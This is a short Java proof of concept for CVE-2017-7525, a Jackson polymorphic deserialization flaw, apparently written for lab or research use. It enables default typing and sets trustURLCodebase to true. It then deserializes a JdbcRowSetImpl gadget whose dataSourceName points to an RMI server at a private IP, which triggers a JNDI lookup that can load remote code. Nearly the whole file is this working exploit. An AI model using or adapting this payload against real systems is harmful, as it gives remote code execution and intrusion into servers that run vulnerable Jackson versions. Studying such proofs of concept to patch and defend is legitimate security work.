package org.example;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.DeserializationConfig;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Hello world!
 *
 */
public class CVE_2017_7525
{
    public static void main( String[] args ) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ObjectMapper objectMapper = new ObjectMapper();
//        objectMapper.enableDefaultTyping();
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);

        // 用ObjectMapper.disableDefaultTyping()设置为只允许@JsonTypeInfo生效
//                objectMapper.disableDefaultTyping();

//        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
//        disableDefaultTypingM.invoke(objectMapper);

        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.16.132:1099/pegg3x\",\"autoCommit\":true}";
        objectMapper.readValue(json, Object.class);
    }
}
